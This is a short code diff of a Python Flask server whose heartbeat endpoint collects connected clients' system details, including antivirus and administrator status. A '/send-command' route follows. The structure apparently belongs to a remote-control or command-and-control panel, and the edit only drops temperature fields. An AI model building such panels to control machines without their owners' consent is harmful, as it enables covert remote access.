@@ -33,11 +33,9 @@ def heartbeat():
             "disks": system_info.get('disks', []),
             "uptime": system_info.get('uptime'),
             "antivirus": system_info.get('antivirus'), # Get antivirus status
-            "is_admin": system_info.get('is_admin'), # Get admin status
-            "temp": system_info.get('temp'), # Get current temperature
-            "temp_max": system_info.get('temp_max') # Get max temperature
+            "is_admin": system_info.get('is_admin') # Get admin status
         }
-        print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Temp: {system_info.get('temp')}°C. Clients online: {len(connected_clients)}")
+        print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Clients online: {len(connected_clients)}")
     return jsonify({"status": "ok"})
 
 @app.route('/send-command', methods=['POST'])
